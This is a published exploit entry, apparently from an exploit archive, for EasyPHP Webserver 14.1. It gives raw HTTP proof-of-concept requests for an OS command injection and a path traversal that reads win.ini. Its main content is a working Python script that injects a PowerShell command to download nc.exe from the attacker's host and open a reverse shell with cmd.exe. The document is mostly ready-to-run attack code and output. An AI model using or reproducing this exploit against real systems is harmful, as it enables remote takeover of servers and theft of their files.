@@ -1,0 +1,124 @@
+id: 38666
+date: 05/05/2023
+title: EasyPHP Webserver 14.1 - Multiple Vulnerabilities (RCE and Path Traversal) Exploit
+author: Rafael Pedrero
+cves: 
+
+# Exploit Title: EasyPHP Webserver 14.1 - Multiple Vulnerabilities (RCE and
+Path Traversal)
+# Discovery by: Rafael Pedrero
+# Discovery Date: 2022-02-06
+# Vendor Homepage: https://www.easyphp.org/
+# Software Link : https://www.easyphp.org/
+# Tested Version: 14.1
+# Tested on:  Windows 7 and 10
+
+# Vulnerability Type: Remote Command Execution (RCE)
+
+CVSS v3: 9.8
+CVSS vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+CWE: CWE-78
+
+Vulnerability description: There is an OS Command Injection in EasyPHP
+Webserver 14.1 that allows an attacker to achieve Remote Code Execution
+(RCE) with administrative privileges.
+
+Proof of concept:
+
+To detect:
+
+POST http://127.0.0.1:10000/index.php?zone=settings HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
+Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+Origin: http://127.0.0.1:10000
+Connection: keep-alive
+Referer: http://127.0.0.1:10000/index.php?zone=settings
+Host: 127.0.0.1:10000
+
+app_service_control=calc.exe
+
+The calculator opens.
+
+Exploit:
+
+# !/usr/bin/python3
+import requests
+import sys
+
+if len(sys.argv) != 5:
+    print("RCE: EasyPHP Webserver 14.1 and before - by Rafa")
+    print("Usage:   %s <TARGET> <TARGET_PORT> <LOCAL_IP> <LOCAL_PORT>" %
+sys.argv[0])
+    print("Example:   %s 192.168.1.10 10000 192.168.1.11 9001" %
+sys.argv[0])
+    exit(1)
+
+else:
+    target = sys.argv[1]
+    targetport = sys.argv[2]
+    localip = sys.argv[3]
+    localport = sys.argv[4]
+    # python3 -m http.server / python2 -m SimpleHTTPServer with nc.exe in
+the directory
+
+    payload =
+"powershell+-command+\"((new-object+System.Net.WebClient).DownloadFile('http://"
++ localip + ':8000' +
+"/nc.exe','%TEMP%\\nc.exe'))\";\"c:\windows\\system32\\cmd.exe+/c+%TEMP%\\nc.exe+"
++ localip + "+" + localport + "+-e+cmd.exe\""
+    print (payload)
+    url = 'http://' + target + ':' + targetport + '/index.php?zone=settings'
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4433.0 Safari/537.36"
+    }
+    data = {'app_service_control':payload}
+
+    try:
+        r = requests.post(url, headers=headers, data=data)
+    except requests.exceptions.ReadTimeout:
+        print("The payload has been sent. Check it!")
+        pass
+
+
+# Vulnerability Type: Path Traversal
+
+CVSS v3: 6.5
+CVSS vector: 3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
+CWE: CWE-22
+
+Vulnerability description: An issue was discovered in EasyPHP Webserver
+14.1. An Absolute Path Traversal vulnerability in / allows remote users to
+bypass intended SecurityManager restrictions and download any file if you
+have adequate permissions outside the documentroot configured on the server.
+
+Proof of concept:
+
+GET /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini
+HTTP/1.1
+Host: 192.168.X.X:10000
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML,
+like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+
+HTTP/1.1 200 OK
+Host: 192.168.X.X:10000
+Connection: close
+Content-Type: application/octet-stream
+Content-Length: 499
+
+; for 16-bit app support [fonts] [extensions] [mci extensions] [files]
+[Mail] MAPI=1 CMCDLLNAME32=mapi32.dll CMCDLLNAME=mapi.dll CMC=1 MAPIX=1
+MAPIXVER=1.0.0.1 OLEMessaging=1 [MCI Extensions.BAK] 3g2=MPEGVideo
+3gp=MPEGVideo 3gp2=MPEGVideo 3gpp=MPEGVideo aac=MPEGVideo adt=MPEGVideo
+adts=MPEGVideo m2t=MPEGVideo m2ts=MPEGVideo m2v=MPEGVideo m4a=MPEGVideo
+m4v=MPEGVideo mod=MPEGVideo mov=MPEGVideo mp4=MPEGVideo mp4v=MPEGVideo
+mts=MPEGVideo ts=MPEGVideo tts=MPEGVideo
+
+#  0day.today [2023-05-22]  #
